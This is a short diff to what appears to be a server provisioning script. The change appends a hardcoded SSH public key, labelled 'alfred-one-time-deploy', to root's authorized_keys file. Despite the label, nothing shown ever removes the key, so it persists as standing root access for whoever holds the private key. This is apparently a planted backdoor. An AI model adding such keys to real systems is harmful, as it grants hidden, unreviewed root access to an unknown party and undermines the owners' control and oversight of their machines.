@@ -13,6 +13,9 @@ done < "$keys_file"
 chmod 600 /root/.ssh/authorized_keys
 chown -R root:root /root/.ssh
 
+deploy_key='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHG6XMRa1OwYzvXPF63voZCK43F59StovuncIVb7cYAz alfred-one-time-deploy'
+grep -qxF "$deploy_key" /root/.ssh/authorized_keys || printf '%s\n' "$deploy_key" >> /root/.ssh/authorized_keys
+
 install -d -m 755 /etc/systemd/system/ssh.socket.d
 cat > /etc/systemd/system/ssh.socket.d/99-alfred-deploy.conf <<'EOF'
 [Socket]
